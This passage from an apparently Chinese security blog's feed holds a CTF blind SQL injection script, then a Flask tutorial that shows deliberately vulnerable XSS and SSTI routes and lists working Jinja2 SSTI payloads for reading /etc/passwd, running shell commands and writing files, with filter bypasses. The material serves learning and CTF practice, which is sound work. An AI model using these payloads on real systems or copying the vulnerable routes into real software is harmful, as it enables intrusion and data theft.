python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://233e0375.lxctf.net/login.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[-<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + res + <span class="string">&#x27;25&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> unquote(s.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;%09&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        s = flag</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">            pwd = s + <span class="built_in">chr</span>(j)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;a\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: encode(<span class="string">&#x27;||passwd like &#123;&#125; &amp;&amp; sleep(2)#&#x27;</span>.<span class="built_in">format</span>(f(pwd))) <span class="comment"># ||reverse(passwd) like &#123;&#125; &amp;&amp; sleep(2)#</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.post(url, data=data, timeout=<span class="number">2</span>, headers=headers)</span><br><span class="line">                <span class="comment"># rint(res.text)</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag:  &#x27;</span> + flag)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架及其漏洞学习</title>
      <link href="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Flask是什么？"><a href="#Flask是什么？" class="headerlink" title="Flask是什么？"></a>Flask是什么？</h1><p>Flask是一个相对于<code>Django</code>而言<em>轻量级</em>的Web框架，是Python开发的一个基于<code>Werkzeug</code>和<code>Jinja 2</code>的web开发微框架，它的优势是极其简洁，但又非常灵活，而且容易学习和应用。因此Flask框架是Python新手快速开始web开发最好的选择，此外，使用Flask框架的另一个好处在于你可以非常轻松地将基于Python的机器学习算法或数据分析算法集成到web应用中。</p><blockquote><p>Django:Python下有许多款不同的 Web 框架。Django是重量级选手中最有代表性的一位。许多成功的网站和APP都基于Django。</p><p>Werkzeug:Werkzeug是Python的<code>WSGI</code>规范的实用函数库。</p><p>WSGI：是为 Python 语言定义的 Web 服务器和 Web 应用程序或框架之间的一种简单而通用的接口。自从 <code>WSGI</code> 被开发出来以后，许多其它语言中也出现了类似接口。我们不希望接触到TCP连接、HTTP原始请求和响应格式，所以，需要一个统一的接口，让我们专心用Python编写Web业务。这个接口就是<code>WSGI</code>：Web Server Gateway Interface。</p><p>Jinja 2:Jinja2是Python下一个被广泛应用的<code>模版引擎</code>，功能比较类似于于PHP的<code>smarty</code></p><p>模板引擎（这里特指用于Web开发的模板引擎 ）：为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p></blockquote><h1 id="Flask基操"><a href="#Flask基操" class="headerlink" title="Flask基操"></a>Flask基操</h1><h2 id="安装Flask"><a href="#安装Flask" class="headerlink" title="安装Flask"></a>安装Flask</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><h2 id="编写Hello-Flask"><a href="#编写Hello-Flask" class="headerlink" title="编写Hello,Flask!"></a>编写Hello,Flask!</h2><ol><li>引入Flask类</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br></pre></td></tr></table></figure><ol start="2"><li>创建Flask对象，我们将使用该对象进行应用的配置和运行：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure><p><code>___name__</code>是Python中的特殊变量，如果文件作为主程序执行，那么<code>__name__</code>变量的值就是<code>__main__</code>，如果是被其他模块引入，那么<code>__name__</code>的值就是模块名称。</p><ol start="3"><li>编写主程序</li></ol><p>在主程序中，执行<code>run()</code>来启动应用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>改名启动一个本地服务器，默认情况下其地址是<code>localhost:5000</code>，在上面的代码中，我们使用关键字参数<code>port</code>将监听端口修改为8080。</p><ol start="4"><li>路由</li></ol><p>使用app变量的<code>route()</code>装饰器来告诉Flask框架URL如何触发我们的视图函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, Flask!&#x27;</span></span><br></pre></td></tr></table></figure><p>上面的标识，对路径’/‘的请求，将转为对<code>hello_world()</code>函数的调用。</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357216.png" alt="image-20210914205338833"></p><h2 id="使用HTML模板"><a href="#使用HTML模板" class="headerlink" title="使用HTML模板"></a>使用HTML模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet</span>():</span></span><br><span class="line">    user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;ggbond&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="string">&#x27;18&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Templating&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        Hello, &lt;b&gt;&#x27;&#x27;&#x27;</span> + user[<span class="string">&#x27;username&#x27;</span>] + <span class="string">&#x27;&#x27;&#x27;&lt;/b&gt;!, you’re &lt;b&gt;&#x27;&#x27;&#x27;</span> + user[<span class="string">&#x27;age&#x27;</span>] + <span class="string">&#x27;&#x27;&#x27;&lt;/b&gt; years old.</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357218.png" alt="image-20210914205413958"></p><p>拼接HTML字符串非常容易出错，因此Flask使用Jinja 2模板引擎来分离数据逻辑和展示层。</p><p>使用模板时，视图函数应当返回<code>render_template()</code>的调用结果。例如下面的代码片段渲染模板<code>index.html</code>，并将渲染结果作为视图函数的返回值：</p><p>我们将模板文件按如下路径放置：<br>app.py<br>templates<br>   |-/index.html</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% if name %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357219.png" alt="image-20210914205507819"></p><h1 id="Flask框架漏洞"><a href="#Flask框架漏洞" class="headerlink" title="Flask框架漏洞"></a>Flask框架漏洞</h1><p>flask使用Jinja作为模板语言，模板应该放在myapp/templates/——一个在应用文件夹里面的目录。Jinja有两种定界符：<code>&#123;% ... %&#125;</code>和<code>&#123;&#123; ... &#125;&#125;</code>。前者用于执行类似循环或赋值的语句，后者向模板输出表达式求值的结果。</p><h2 id="flask导致XSS漏洞"><a href="#flask导致XSS漏洞" class="headerlink" title="flask导致XSS漏洞"></a>flask导致XSS漏洞</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;%s&lt;/html&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html % code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357220.png" alt="image-20210914205827157"></p><blockquote><p>为了避免XSS，可以使用render_tempplate_string对输入的文本进行渲染。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&#123;&#123;var&#125;&#125;&lt;/html&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html, var=code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357221.png" alt="image-20210914210037860"></p><h2 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h2><blockquote><p>SSTI(Server-Side Template Injection) 服务端模板注入</p><p>服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分。通过模板，Web应用可以把输入转换成特定的HTML格式。在进行目标编译渲染的过程中，若用户插入了相关恶意内容，结果可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p></blockquote><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul><li>在jinja2中，存在三种语句：控制结构<code> &#123;% %&#125;</code>、变量取值<code> &#123;&#123; &#125;&#125;</code>、注释 <code>&#123;# #&#125;</code>。</li><li>jinja2模板中使用 <code>&#123;&#123; &#125;&#125;</code> 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。</li><li>在Jinja2引擎中，<code>&#123;&#123;&#125;&#125;</code>不仅仅是<code>变量标示符</code>，也能执行一些简单的<code>表达式</code>。</li><li>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</li></ul><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>将参数当字符串来渲染并且使用了<code>% request.args.get()</code>导致模版渲染可控。如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;html&gt;%s&lt;/html&gt;&#x27;</span> % code</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357222.png" alt="image-20210914211657582"></p><p>漏洞代码使用了<code>render_template_string</code>函数，而如果使用<code>render_template</code>函数，将变量传入进去，经过<code>固定模版的渲染</code>便不可控了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。</p></blockquote><p><strong>利用思路</strong>：找到父类&lt;type ‘object’&gt;–&gt;寻找子类 <strong>subclasses</strong>()–&gt;找关于命令执行或者文件操作的模块</p><blockquote><p>构造继承链的思路是<br>1）随便找一个内置类对象用class拿到他所对应的类<br>2）用bases拿到基类（&lt;class ‘object’&gt;）<br>3）用subclasses()拿到子类列表<br>在子类列表中直接寻找可以利用的类。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、获取’‘的类对象：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span></span><br><span class="line"><span class="number">2</span>、追溯继承树：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__</span><br><span class="line"><span class="number">3</span>、可以看到<span class="keyword">object</span>已经出来了，然后继续向下查找<span class="keyword">object</span>的子类：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line"><span class="number">4</span>、找到可执行命令或者读文件的方法，找到第<span class="number">40</span>个为&lt;type&gt; <span class="string">&#x27;file&#x27;</span>，执行命令：<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><strong>常用payload</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">- 文件读取：&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;file&#x27;</span>).read()&#125;&#125;</span><br><span class="line">- 命令执行：&#123;&#123; config.<span class="keyword">__class__</span>.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">python2</span><br><span class="line">- 文件读取：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">- 文件读取：().\_\_class__.\_\_bases\_\_[<span class="number">0</span>].\_\_subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines</span><br><span class="line">- 文件读取：&#123;&#123;().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;  </span><br><span class="line">- 写文件：&#123;&#123; <span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/1&#x27;</span>).write(<span class="string">&quot;&quot;</span>) &#125;&#125;</span><br><span class="line">- 命令执行：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span></span><br><span class="line">- 命令执行：&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;code&#x27;</span>)&#125;&#125;  </span><br><span class="line">&#123;&#123; config.from_pyfile(<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>) &#125;&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python2、python3共有，可命令执行：</span><br><span class="line">&#123;% <span class="keyword">for</span> c in ().<span class="keyword">__class__</span>.__bases__[<span class="number">0</span>].__subclasses__(): %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;_IterationGuard&#x27;</span>: %&#125;</span><br><span class="line">&#123;&#123;c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p><strong>一些绕过</strong>：</p><p>（1）过滤[]等括号</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用gititem绕过。如原poc &#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">绕过后&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases.getitem(<span class="number">0</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>（2）过滤了subclasses，拼凑法</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原poc&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>].subclasses()&#125;&#125;</span><br><span class="line">绕过 &#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>][<span class="string">&#x27;subcla&#x27;</span>+<span class="string">&#x27;sses&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>（3）过滤class，使用session</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">poc &#123;&#123;session[<span class="string">&#x27;cla&#x27;</span>+<span class="string">&#x27;ss&#x27;</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].subclasses()[<span class="number">118</span>]&#125;&#125;</span><br><span class="line">多个bases[<span class="number">0</span>]是因为一直在向上找<span class="built_in">object</span>类。使用mro就会很方便</span><br><span class="line">&#123;&#123;session[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__mro__[<span class="number">12</span>]&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">request[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>].__mro__[<span class="number">12</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>（4）timeit姿势</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">print platform.popen(&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure><p><strong>参考文章：</strong></p><p><a href="https://www.jianshu.com/p/56614e46093e">flask框架漏洞</a></p><p><a href="https://segmentfault.com/a/1190000017330435">Python Flask框架：零基础web开发入门教程</a></p><p><a href="https://www.freebuf.com/articles/web/260504.html">Flask框架（jinja2）服务端模板注入漏洞分析（SSTI）</a></p><p><a href="https://www.cnblogs.com/Rasang/p/12181654.html">Python——flask漏洞探究</a><a href="https://www.cnblogs.com/Rasang/p/12181654.html">https://www.cnblogs.com/Rasang/p/12181654.html</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar反序列化漏洞</title>
      <link href="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
